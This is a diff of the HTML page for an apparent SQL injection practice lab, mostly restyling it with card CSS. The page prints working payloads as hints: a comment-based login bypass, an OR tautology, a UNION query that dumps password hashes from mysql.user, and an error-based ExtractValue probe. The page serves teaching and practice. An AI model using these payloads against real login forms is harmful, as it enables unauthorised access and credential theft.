@@ -15,10 +15,10 @@
 
 	<body>
 		<h1>SQL Login page</h1>
-		<div class="flex">
-			<div class="tips">
-				<div>
-					<h2>Normal login</h2>
+		<div class="flex ">
+			<div class="tips card">
+				<div class="card-content">
+					<h2 class="card-title">Normal login</h2>
 					<form method="POST" action="./php/login.php">
 						<input type="text" name="user" placeholder="Username"
 							   required><br>
@@ -34,50 +34,89 @@
 					password</p>
 				<p>Try that combination to log in as the first user in db!
 				</p>
-				<p>username: Arthur’ -- -</p>
-				<p>password: anything</p>
+				<p>username: <span class="highlight">Arthur’ -- -</span></p>
+				<p>password: <span class="highlight">anything</span></p>
 			</div>
 		</div>
 		<div class="flex">
-			<div class="tips">
-				<h2>SQL union login</h2>
-				<form method="GET" action="./php/union_login.php">
-					<input type="text" name="payload" placeholder="Username"
-						   required><br>
-					<input type="submit" value="Login">
-				</form>
+			<div class="tips card">
+				<div class="card-content">
+					<h2 class="card-title">SQL union login</h2>
+					<form method="GET" action="./php/union_login.php">
+						<input type="text" name="payload" placeholder="Username"
+							   required><br>
+						<input type="submit" value="Login">
+					</form>
+				</div>
 			</div>
 			<div class="tips">
 				<h6>The query will look for an user that matches the username
 				</h6>
-				<p>Try Arthur' OR 'a'='a' to get all of the results!</p>
-				<h6>Or call a different db or table!</h6>
-				<p>Arthur' UNION ALL SELECT user AS username, null AS id,
+				<p>Try <span class="highlight">Arthur' OR 'a'='a'</span> to get
+					all of the
+					results!</p>
+				<h6>Or call a different db or table though union injection!</h6>
+				<p class="highlight">Arthur' UNION ALL SELECT user AS username,
+					null AS id,
 					authentication_string AS password_auth,NULL FROM mysql.user
 					-- -</p>
+				<h6>Check what is the current user of the query and his address
+					and DB version!</h6>
+				<p class="highlight">Arthur' AND ExtractValue(0, CONCAT( 0x5c,
+					User() ) ) -- -'
+				</p>
 
+			</div>
+		</div>
+		<div class="flex">
+			<div class="tips card">
+				<div class="card-content">
+					<h2 class="card-title">SQL sanitized login</h2>
+					<form method="GET" action="./php/sanitized_login.php">
+						<input type="text" name="payload" placeholder="Username"
+							   required><br>
+						<input type="submit" value="Login">
+					</form>
+				</div>
+			</div>
+			<div class="tips">
+				<h6>The query will stanizie the payload and look for an user
+					that matches the username
+				</h6>
+				<p>Try <span class="highlight">Arthur' OR 'a'='a'</span> to
+					get
+					all of the
+					results!</p>
 			</div>
 		</div>
 
 	</body>
 	<style>
 		html {
-			font-family: 'Montserrat', sans-serif;
+			font-family: "Anek Latin", sans-serif;
+			margin: 0;
+			padding: 0;
 		}
 
-		h1 div {
-			display: block;
-			width: 40%;
-			margin: 10px;
-			padding: 10px;
-			border: 1px solid black;
+		p {
+			font-size: larger;
 		}
+
+		.highlight {
+			background-color: cadetblue;
+			border: 1px solid transparent;
+			border-radius: 5px;
+		}
+
+
 
 		.flex {
 			display: flex;
 			flex-direction: row;
 			justify-content: space-between;
 		}
+
+
 
 		.tips {
 			display: inline-block;
@@ -87,6 +126,126 @@
 			border: 1px solid black;
 			border-radius: 5px;
 
+		}
+
+		:root {
+			--border: rgb(3, 169, 244);
+
+			--g1: rgb(98, 0, 234);
+			--g2: rgb(236, 64, 122);
+			--g3: rgb(253, 216, 53);
+		}
+
+		body {
+			background-color: rgb(239, 239, 239);
+			height: 100vh;
+			margin: 0px;
+			padding: 0px;
+			place-items: center;
+		}
+
+		.card {
+			border: 0.5vmin solid var(--border);
+			cursor: pointer;
+			position: relative;
+			width: 56vmin;
+		}
+
+		.card:hover:before {
+			background-position: 100% 100%;
+			transform: scale(1.08, 1.03);
+		}
+
+		.card:hover>.card-content {
+			background-position: -10% 0%;
+		}
+
+		.card:hover>.card-content>.card-title {
+			color: white;
+			transition: color 250ms ease;
+		}
+
+		.card:hover>.card-icon {
+			color: white;
+		}
+
+		.card:hover>.card-content>.card-subtitle>.card-subtitle-word {
+			opacity: 1;
+			transform: translateY(0%);
+			transition: opacity 0ms, transform 200ms cubic-bezier(.90, .06, .15, .90);
+		}
+
+		.card:before {
+			background: linear-gradient(130deg,
+					transparent 0% 33%,
+					var(--g1) 66%,
+					var(--g2) 83.5%,
+					var(--g3) 100%);
+			background-position: 0% 0%;
+			background-size: 300% 300%;
+			content: "";
+			height: 100%;
+			left: 0px;
+			pointer-events: none;
+			position: absolute;
+			top: 0px;
+			transition: background-position 350ms ease, transform 350ms ease;
+			width: 100%;
+			z-index: 1;
+		}
+
+		.card-content {
+			background-image: radial-gradient(rgba(255, 255, 255, 0.2) 8%,
+					transparent 8%);
+			background-position: 0% 0%;
+			background-size: 5vmin 5vmin;
+			height: calc(100% - 10vmin);
+			padding: 5vmin;
+			position: relative;
+			transition: background-position 350ms ease;
+			width: calc(100% - 10vmin);
+			z-index: 2;
+		}
+
+		.card-title,
+		.card-subtitle {
+			font-family: "Anek Latin", sans-serif;
+			font-weight: 400;
+			margin: 0px;
+		}
+
+
+
+		.card-title {
+			font-size: 6vmin;
+			color: grey;
+		}
+
+		.card-subtitle {
+			font-size: 3vmin;
+			margin-top: 2vmin;
+		}
+
+		.card-subtitle-word {
+			display: inline-block;
+			margin: 0vmin 0.3vmin;
+			opacity: 0;
+			position: relative;
+			transform: translateY(40%);
+			transition: none;
+			color: white;
+
+		}
+
+		.card-icon {
+			bottom: 0px;
+			color: rgba(255, 255, 255, 0.5);
+			font-size: 7vmin;
+			left: 0px;
+			margin: 5vmin;
+			position: absolute;
+			transition: color 250ms ease;
+			z-index: 2;
 		}
 	</style>
 
